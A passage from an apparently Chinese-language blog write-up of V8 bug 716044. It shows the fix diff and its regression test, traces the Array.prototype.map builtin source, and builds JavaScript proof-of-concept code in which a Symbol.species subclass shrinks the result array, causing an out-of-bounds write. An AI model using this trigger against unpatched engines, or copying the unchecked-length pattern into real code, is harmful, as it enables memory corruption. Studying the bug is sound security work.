class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array-gen.cc b/src/builtins/builtins-array-gen.cc</span><br><span class="line">index 32dd9b5..316c0b7 100644</span><br><span class="line">--- a/src/builtins/builtins-array-gen.cc</span><br><span class="line">+++ b/src/builtins/builtins-array-gen.cc</span><br><span class="line">@@ -15,13 +15,11 @@</span><br><span class="line">       : CodeStubAssembler(state),</span><br><span class="line">         k_(this, MachineRepresentation::kTagged),</span><br><span class="line">         a_(this, MachineRepresentation::kTagged),</span><br><span class="line">-        to_(this, MachineRepresentation::kTagged, SmiConstant(0)) &#123;&#125;</span><br><span class="line">-</span><br><span class="line">-  typedef std::function&lt;Node*(ArrayBuiltinCodeStubAssembler* masm)&gt;</span><br><span class="line">-      BuiltinResultGenerator;</span><br><span class="line">+        to_(this, MachineRepresentation::kTagged, SmiConstant(0)),</span><br><span class="line">+        fully_spec_compliant_(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;) &#123;&#125;</span><br><span class="line"> </span><br><span class="line">   typedef std::function&lt;void(ArrayBuiltinCodeStubAssembler* masm)&gt;</span><br><span class="line">-      BuiltinResultIndexInitializer;</span><br><span class="line">+      BuiltinResultGenerator;</span><br><span class="line"> </span><br><span class="line">   typedef std::function&lt;Node*(ArrayBuiltinCodeStubAssembler* masm,</span><br><span class="line">                               Node* k_value, Node* k)&gt;</span><br><span class="line">@@ -30,7 +28,7 @@</span><br><span class="line">   typedef std::function&lt;void(ArrayBuiltinCodeStubAssembler* masm)&gt;</span><br><span class="line">       PostLoopAction;</span><br><span class="line"> </span><br><span class="line">-  Node* ForEachResultGenerator() &#123; return UndefinedConstant(); &#125;</span><br><span class="line">+  void ForEachResultGenerator() &#123; a_.Bind(UndefinedConstant()); &#125;</span><br><span class="line"> </span><br><span class="line">   Node* ForEachProcessor(Node* k_value, Node* k) &#123;</span><br><span class="line">     CallJS(CodeFactory::Call(isolate()), context(), callbackfn(), this_arg(),</span><br><span class="line">@@ -38,7 +36,7 @@</span><br><span class="line">     return a();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">-  Node* SomeResultGenerator() &#123; return FalseConstant(); &#125;</span><br><span class="line">+  void SomeResultGenerator() &#123; a_.Bind(FalseConstant()); &#125;</span><br><span class="line"> </span><br><span class="line">   Node* SomeProcessor(Node* k_value, Node* k) &#123;</span><br><span class="line">     Node* value = CallJS(CodeFactory::Call(isolate()), context(), callbackfn(),</span><br><span class="line">@@ -51,7 +49,7 @@</span><br><span class="line">     return a();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">-  Node* EveryResultGenerator() &#123; return TrueConstant(); &#125;</span><br><span class="line">+  void EveryResultGenerator() &#123; a_.Bind(TrueConstant()); &#125;</span><br><span class="line"> </span><br><span class="line">   Node* EveryProcessor(Node* k_value, Node* k) &#123;</span><br><span class="line">     Node* value = CallJS(CodeFactory::Call(isolate()), context(), callbackfn(),</span><br><span class="line">@@ -64,7 +62,7 @@</span><br><span class="line">     return a();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">-  Node* ReduceResultGenerator() &#123; return this_arg(); &#125;</span><br><span class="line">+  void ReduceResultGenerator() &#123; return a_.Bind(this_arg()); &#125;</span><br><span class="line"> </span><br><span class="line">   Node* ReduceProcessor(Node* k_value, Node* k) &#123;</span><br><span class="line">     VARIABLE(result, MachineRepresentation::kTagged);</span><br><span class="line">@@ -91,9 +89,9 @@</span><br><span class="line">     BIND(&amp;ok);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">-  Node* FilterResultGenerator() &#123;</span><br><span class="line">+  void FilterResultGenerator() &#123;</span><br><span class="line">     // 7. Let A be ArraySpeciesCreate(O, 0).</span><br><span class="line">-    return ArraySpeciesCreate(context(), o(), SmiConstant(0));</span><br><span class="line">+    a_.Bind(ArraySpeciesCreate(context(), o(), SmiConstant(0)));</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   Node* FilterProcessor(Node* k_value, Node* k) &#123;</span><br><span class="line">@@ -162,13 +160,53 @@</span><br><span class="line">     return a();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">-  Node* MapResultGenerator() &#123;</span><br><span class="line">-    // 5. Let A be ? ArraySpeciesCreate(O, len).</span><br><span class="line">-    return ArraySpeciesCreate(context(), o(), len_);</span><br><span class="line">+  void MapResultGenerator() &#123;</span><br><span class="line">+    Label runtime(this), done(this, &#123;&amp;a_&#125;);</span><br><span class="line">+    GotoIf(DoesntHaveInstanceType(o(), JS_ARRAY_TYPE), &amp;runtime);</span><br><span class="line">+    Node* o_map = LoadMap(o());</span><br><span class="line">+    Node* const initial_array_prototype = LoadContextElement(</span><br><span class="line">+        LoadNativeContext(context()), Context::INITIAL_ARRAY_PROTOTYPE_INDEX);</span><br><span class="line">+    Node* proto = LoadMapPrototype(o_map);</span><br><span class="line">+    GotoIf(WordNotEqual(proto, initial_array_prototype), &amp;runtime);</span><br><span class="line">+</span><br><span class="line">+    Node* species_protector = SpeciesProtectorConstant();</span><br><span class="line">+    Node* value = LoadObjectField(species_protector, Cell::kValueOffset);</span><br><span class="line">+    Node* const protector_invalid = SmiConstant(Isolate::kProtectorInvalid);</span><br><span class="line">+    GotoIf(WordEqual(value, protector_invalid), &amp;runtime);</span><br><span class="line">+</span><br><span class="line">+    Node* const initial_array_constructor = LoadContextElement(</span><br><span class="line">+        LoadNativeContext(context()), Context::ARRAY_FUNCTION_INDEX);</span><br><span class="line">+    a_.Bind(ConstructJS(CodeFactory::Construct(isolate()), context(),</span><br><span class="line">+                        initial_array_constructor, len_));</span><br><span class="line">+    Goto(&amp;done);</span><br><span class="line">+</span><br><span class="line">+    BIND(&amp;runtime);</span><br><span class="line">+    &#123;</span><br><span class="line">+      // 5. Let A be ? ArraySpeciesCreate(O, len).</span><br><span class="line">+      Node* constructor =</span><br><span class="line">+          CallRuntime(Runtime::kArraySpeciesConstructor, context(), o());</span><br><span class="line">+      a_.Bind(ConstructJS(CodeFactory::Construct(isolate()), context(),</span><br><span class="line">+                          constructor, len_));</span><br><span class="line">+      Goto(&amp;fully_spec_compliant_);</span><br><span class="line">+    &#125;</span><br><span class="line">+    BIND(&amp;done);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">-  Node* MapProcessor(Node* k_value, Node* k) &#123;</span><br><span class="line">-    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of MapProcessor.</span><br><span class="line">+  Node* SpecCompliantMapProcessor(Node* k_value, Node* k) &#123;</span><br><span class="line">+    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of</span><br><span class="line">+    //  SpecCompliantMapProcessor.</span><br><span class="line">+    // ii. Let mappedValue be ? Call(callbackfn, T, kValue, k, O).</span><br><span class="line">+    Node* mappedValue = CallJS(CodeFactory::Call(isolate()), context(),</span><br><span class="line">+                               callbackfn(), this_arg(), k_value, k, o());</span><br><span class="line">+</span><br><span class="line">+    // iii. Perform ? CreateDataPropertyOrThrow(A, Pk, mappedValue).</span><br><span class="line">+    CallRuntime(Runtime::kCreateDataProperty, context(), a(), k, mappedValue);</span><br><span class="line">+    return a();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* FastMapProcessor(Node* k_value, Node* k) &#123;</span><br><span class="line">+    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of</span><br><span class="line">+    //  FastMapProcessor.</span><br><span class="line">     // ii. Let mappedValue be ? Call(callbackfn, T, kValue, k, O).</span><br><span class="line">     Node* mappedValue = CallJS(CodeFactory::Call(isolate()), context(),</span><br><span class="line">                                callbackfn(), this_arg(), k_value, k, o());</span><br><span class="line">@@ -268,8 +306,7 @@</span><br><span class="line">       const CallResultProcessor&amp; processor, const PostLoopAction&amp; action,</span><br><span class="line">       const Callable&amp; slow_case_continuation,</span><br><span class="line">       ForEachDirection direction = ForEachDirection::kForward) &#123;</span><br><span class="line">-    Label non_array(this), slow(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;),</span><br><span class="line">-        array_changes(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;);</span><br><span class="line">+    Label non_array(this), array_changes(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;);</span><br><span class="line"> </span><br><span class="line">     // TODO(danno): Seriously? Do we really need to throw the exact error</span><br><span class="line">     // message on null and undefined so that the webkit tests pass?</span><br><span class="line">@@ -336,11 +373,11 @@</span><br><span class="line">       k_.Bind(NumberDec(len()));</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">-    a_.Bind(generator(this));</span><br><span class="line">+    generator(this);</span><br><span class="line"> </span><br><span class="line">-    HandleFastElements(processor, action, &amp;slow, direction);</span><br><span class="line">+    HandleFastElements(processor, action, &amp;fully_spec_compliant_, direction);</span><br><span class="line"> </span><br><span class="line">-    BIND(&amp;slow);</span><br><span class="line">+    BIND(&amp;fully_spec_compliant_);</span><br><span class="line"> </span><br><span class="line">     Node* result =</span><br><span class="line">         CallStub(slow_case_continuation, context(), receiver(), callbackfn(),</span><br><span class="line">@@ -440,7 +477,7 @@</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">       k_.Bind(NumberDec(len()));</span><br><span class="line">     &#125;</span><br><span class="line">-    a_.Bind(generator(this));</span><br><span class="line">+    generator(this);</span><br><span class="line">     Node* elements_type = LoadInstanceType(LoadElements(o_));</span><br><span class="line">     Switch(elements_type, &amp;unexpected_instance_type, instance_types.data(),</span><br><span class="line">            label_ptrs.data(), labels.size());</span><br><span class="line">@@ -690,6 +727,7 @@</span><br><span class="line">   Variable k_;</span><br><span class="line">   Variable a_;</span><br><span class="line">   Variable to_;</span><br><span class="line">+  Label fully_spec_compliant_;</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> TF_BUILTIN(FastArrayPush, CodeStubAssembler) &#123;</span><br><span class="line">@@ -1168,7 +1206,7 @@</span><br><span class="line">                                             len, to);</span><br><span class="line"> </span><br><span class="line">   GenerateIteratingArrayBuiltinLoopContinuation(</span><br><span class="line">-      &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,</span><br><span class="line">+      &amp;ArrayBuiltinCodeStubAssembler::SpecCompliantMapProcessor,</span><br><span class="line">       &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">@@ -1187,7 +1225,7 @@</span><br><span class="line"> </span><br><span class="line">   GenerateIteratingArrayBuiltinBody(</span><br><span class="line">       &quot;Array.prototype.map&quot;, &amp;ArrayBuiltinCodeStubAssembler::MapResultGenerator,</span><br><span class="line">-      &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,</span><br><span class="line">+      &amp;ArrayBuiltinCodeStubAssembler::FastMapProcessor,</span><br><span class="line">       &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction,</span><br><span class="line">       Builtins::CallableFor(isolate(), Builtins::kArrayMapLoopContinuation));</span><br><span class="line"> &#125;</span><br><span class="line">diff --git a/src/code-stub-assembler.h b/src/code-stub-assembler.h</span><br><span class="line">index dbdd5f0..ba35e25 100644</span><br><span class="line">--- a/src/code-stub-assembler.h</span><br><span class="line">+++ b/src/code-stub-assembler.h</span><br><span class="line">@@ -51,7 +51,8 @@</span><br><span class="line">   V(Tuple2Map, Tuple2Map)                             \</span><br><span class="line">   V(Tuple3Map, Tuple3Map)                             \</span><br><span class="line">   V(UndefinedValue, Undefined)                        \</span><br><span class="line">-  V(WeakCellMap, WeakCellMap)</span><br><span class="line">+  V(WeakCellMap, WeakCellMap)                         \</span><br><span class="line">+  V(SpeciesProtector, SpeciesProtector)</span><br><span class="line"> </span><br><span class="line"> // Provides JavaScript-specific &quot;macro-assembler&quot; functionality on top of the</span><br><span class="line"> // CodeAssembler. By factoring the JavaScript-isms out of the CodeAssembler,</span><br><span class="line">diff --git a/test/mjsunit/mjsunit.status b/test/mjsunit/mjsunit.status</span><br><span class="line">index 60fc9e6..25bc972 100644</span><br><span class="line">--- a/test/mjsunit/mjsunit.status</span><br><span class="line">+++ b/test/mjsunit/mjsunit.status</span><br><span class="line">@@ -65,6 +65,7 @@</span><br><span class="line">   # Too slow in debug mode for validation of elements.</span><br><span class="line">   &#x27;regress/regress-430201&#x27;: [PASS, [&#x27;mode == debug&#x27;, SKIP]],</span><br><span class="line">   &#x27;regress/regress-430201b&#x27;: [PASS, [&#x27;mode == debug&#x27;, SKIP]],</span><br><span class="line">+  &#x27;regress/regress-716044&#x27;: [PASS, [&#x27;mode == debug&#x27;, SKIP]],</span><br><span class="line"> </span><br><span class="line">   ##############################################################################</span><br><span class="line">   # Too slow in debug mode for GC stress mode.</span><br><span class="line">diff --git a/test/mjsunit/regress/regress-716044.js b/test/mjsunit/regress/regress-716044.js</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..264424c</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/test/mjsunit/regress/regress-716044.js</span><br><span class="line">@@ -0,0 +1,25 @@</span><br><span class="line">+// Copyright 2017 the V8 project authors. All rights reserved.</span><br><span class="line">+// Use of this source code is governed by a BSD-style license that can be</span><br><span class="line">+// found in the LICENSE file.</span><br><span class="line">+</span><br><span class="line">+// Flags: --verify-heap</span><br><span class="line">+</span><br><span class="line">+class Array1 extends Array &#123;</span><br><span class="line">+  constructor(len) &#123;</span><br><span class="line">+      super(1);</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;;</span><br><span class="line">+</span><br><span class="line">+class MyArray extends Array &#123;</span><br><span class="line">+  static get [Symbol.species]() &#123;</span><br><span class="line">+      return Array1;</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+a = new MyArray();</span><br><span class="line">+</span><br><span class="line">+for (var i = 0; i &lt; 100000; i++) &#123;</span><br><span class="line">+  a.push(1);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+a.map(function(x) &#123; return 42; &#125;);</span><br></pre></td></tr></table></figure>
<p>这题与前一题类似，也是一个真实的v8历史漏洞，代号为<code>716044</code>。从patch中，我们看到其中<code>MapResultGenerator</code>函数的变化较大，我们查找其的上层调用，发现其在<code>TF_BUILTIN(ArrayMap, ArrayBuiltinCodeStubAssembler)</code>函数中被调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GenerateIteratingArrayBuiltinBody(</span><br><span class="line">    &quot;Array.prototype.map&quot;, &amp;ArrayBuiltinCodeStubAssembler::MapResultGenerator,</span><br><span class="line">    &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,</span><br><span class="line">    &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction,</span><br><span class="line">    Builtins::CallableFor(isolate(), Builtins::kArrayMapLoopContinuation));</span><br></pre></td></tr></table></figure>
<p>可以知道这是<code>Array.prototype.map</code>函数的具体实现，该函数的作用是将键值进行映射</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3,4];</span><br><span class="line">print(a.map(function(x) &#123; return x+1;  &#125;));</span><br></pre></td></tr></table></figure>
<p>其输出为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/issue_716044/x64.release# ./d8 t.js</span><br><span class="line">2,3,4,5</span><br></pre></td></tr></table></figure>
<p>即该函数接收一个函数对象，作为映射的变换函数，映射的值来源于调用数组对象。继续分析GenerateIteratingArrayBuiltinBody函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">void GenerateIteratingArrayBuiltinBody(</span><br><span class="line">      const char* name, const BuiltinResultGenerator&amp; generator,</span><br><span class="line">      const CallResultProcessor&amp; processor, const PostLoopAction&amp; action,</span><br><span class="line">      const Callable&amp; slow_case_continuation,</span><br><span class="line">      ForEachDirection direction = ForEachDirection::kForward) &#123;</span><br><span class="line">    Label non_array(this), slow(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;),</span><br><span class="line">        array_changes(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;);</span><br><span class="line"></span><br><span class="line">    // TODO(danno): Seriously? Do we really need to throw the exact error</span><br><span class="line">    // message on null and undefined so that the webkit tests pass?</span><br><span class="line">    Label throw_null_undefined_exception(this, Label::kDeferred);</span><br><span class="line">    GotoIf(WordEqual(receiver(), NullConstant()),</span><br><span class="line">           &amp;throw_null_undefined_exception);</span><br><span class="line">    GotoIf(WordEqual(receiver(), UndefinedConstant()),</span><br><span class="line">           &amp;throw_null_undefined_exception);</span><br><span class="line"></span><br><span class="line">    // By the book: taken directly from the ECMAScript 2015 specification</span><br><span class="line"></span><br><span class="line">    // 1. Let O be ToObject(this value).</span><br><span class="line">    // 2. ReturnIfAbrupt(O)</span><br><span class="line">	//o_是原数组对象</span><br><span class="line">    o_ = CallStub(CodeFactory::ToObject(isolate()), context(), receiver());</span><br><span class="line"></span><br><span class="line">    // 3. Let len be ToLength(Get(O, &quot;length&quot;)).</span><br><span class="line">    // 4. ReturnIfAbrupt(len).</span><br><span class="line">    VARIABLE(merged_length, MachineRepresentation::kTagged);</span><br><span class="line">    Label has_length(this, &amp;merged_length), not_js_array(this);</span><br><span class="line">    GotoIf(DoesntHaveInstanceType(o(), JS_ARRAY_TYPE), &amp;not_js_array);</span><br><span class="line">    merged_length.Bind(LoadJSArrayLength(o()));</span><br><span class="line">    Goto(&amp;has_length);</span><br><span class="line">    BIND(&amp;not_js_array);</span><br><span class="line">    Node* len_property =</span><br><span class="line">        GetProperty(context(), o(), isolate()-&gt;factory()-&gt;length_string());</span><br><span class="line">    merged_length.Bind(</span><br><span class="line">        CallStub(CodeFactory::ToLength(isolate()), context(), len_property));</span><br><span class="line">    Goto(&amp;has_length);</span><br><span class="line">    BIND(&amp;has_length);</span><br><span class="line">	//len值为原数组的长度</span><br><span class="line">    len_ = merged_length.value();</span><br><span class="line"></span><br><span class="line">    // 5. If IsCallable(callbackfn) is false, throw a TypeError exception.</span><br><span class="line">    Label type_exception(this, Label::kDeferred);</span><br><span class="line">    Label done(this);</span><br><span class="line">    GotoIf(TaggedIsSmi(callbackfn()), &amp;type_exception);</span><br><span class="line">    Branch(IsCallableMap(LoadMap(callbackfn())), &amp;done, &amp;type_exception);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;throw_null_undefined_exception);</span><br><span class="line">    &#123;</span><br><span class="line">      CallRuntime(</span><br><span class="line">          Runtime::kThrowTypeError, context(),</span><br><span class="line">          SmiConstant(MessageTemplate::kCalledOnNullOrUndefined),</span><br><span class="line">          HeapConstant(isolate()-&gt;factory()-&gt;NewStringFromAsciiChecked(name)));</span><br><span class="line">      Unreachable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;type_exception);</span><br><span class="line">    &#123;</span><br><span class="line">      CallRuntime(Runtime::kThrowTypeError, context(),</span><br><span class="line">                  SmiConstant(MessageTemplate::kCalledNonCallable),</span><br><span class="line">                  callbackfn());</span><br><span class="line">      Unreachable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;done);</span><br><span class="line"></span><br><span class="line">    // 6. If thisArg was supplied, let T be thisArg; else let T be undefined.</span><br><span class="line">    // [Already done by the arguments adapter]</span><br><span class="line"></span><br><span class="line">    if (direction == ForEachDirection::kForward) &#123;</span><br><span class="line">      // 7. Let k be 0.</span><br><span class="line">      k_.Bind(SmiConstant(0));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      k_.Bind(NumberDec(len()));</span><br><span class="line">    &#125;</span><br><span class="line">    //调用MapResultGenerator函数创建用于保存结果的数组</span><br><span class="line">    a_.Bind(generator(this));</span><br><span class="line"></span><br><span class="line">    HandleFastElements(processor, action, &amp;slow, direction);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;slow);</span><br><span class="line">   //调用映射函数生成映射，并将结果保存到a_中</span><br><span class="line">    Node* result =</span><br><span class="line">        CallStub(slow_case_continuation, context(), receiver(), callbackfn(),</span><br><span class="line">                 this_arg(), a_.value(), o(), k_.value(), len(), to_.value());</span><br><span class="line">    ReturnFromBuiltin(result);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>而<code>MapResultGenerator</code>函数调用了<code>ArraySpeciesCreate</code>，继续跟踪</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Node* MapResultGenerator() &#123;</span><br><span class="line">  // 5. Let A be ? ArraySpeciesCreate(O, len).</span><br><span class="line">  return ArraySpeciesCreate(context(), o(), len_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>ArraySpeciesCreate</code>函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Node* CodeStubAssembler::ArraySpeciesCreate(Node* context, Node* originalArray,</span><br><span class="line">                                            Node* len) &#123;</span><br><span class="line">  // TODO(mvstanton): Install a fast path as well, which avoids the runtime</span><br><span class="line">  // call.</span><br><span class="line">  Node* constructor =</span><br><span class="line">      CallRuntime(Runtime::kArraySpeciesConstructor, context, originalArray);</span><br><span class="line">  return ConstructJS(CodeFactory::Construct(isolate()), context, constructor,</span><br><span class="line">                     len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回调了js层的SpeciesConstructor函数，目的是为了调用合适的构造函数，比如如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class MyArray extends Array &#123;</span><br><span class="line">  static get [Symbol.species]() &#123;</span><br><span class="line">      return Array;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = new MyArray(1.1,2.2);</span><br><span class="line">var b = a.map(function(x) &#123;return x+1&#125;);</span><br><span class="line">%DebugPrint(b);</span><br></pre></td></tr></table></figure>
<p>其中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static get [Symbol.species]()</span><br></pre></td></tr></table></figure>
<p>是固定写法，该函数返回一个类型，那么下一步回调结束，程序就会从Array类里调用构造函数，从而创建了一个Array的对象，假如代码改为如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Array1 extends Array &#123;</span><br><span class="line">  constructor(len) &#123;</span><br><span class="line">      print(&quot;len=&quot; + len);</span><br><span class="line">      super(len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class MyArray extends Array &#123;</span><br><span class="line">  static get [Symbol.species]() &#123;</span><br><span class="line">      return Array1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = new MyArray(1.1,2.2);</span><br><span class="line">var b = a.map(function(x) &#123;return x+1&#125;);</span><br><span class="line">%DebugPrint(b);</span><br></pre></td></tr></table></figure>
<p>由于<code>static get [Symbol.species]()</code>返回了Array1，因此map时会从Array1里调用构造函数，此时，我们可以控制<code>super()</code>函数里的参数，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lass Array1 extends Array &#123;</span><br><span class="line">  constructor(len) &#123;</span><br><span class="line">      super(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class MyArray extends Array &#123;</span><br><span class="line">  static get [Symbol.species]() &#123;</span><br><span class="line">      return Array1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = new MyArray(1.1,2.2);</span><br><span class="line">var b = a.map(function(x) &#123;return x+1&#125;);</span><br><span class="line">%DebugPrint(b);</span><br></pre></td></tr></table></figure>
<p>但是最后映射结果的时候，仍然使用的之前的len，因此在进行函数映射时，由于没有检查用于存放结果的数组的长度，便发生了<code>越界写</code>。</p>
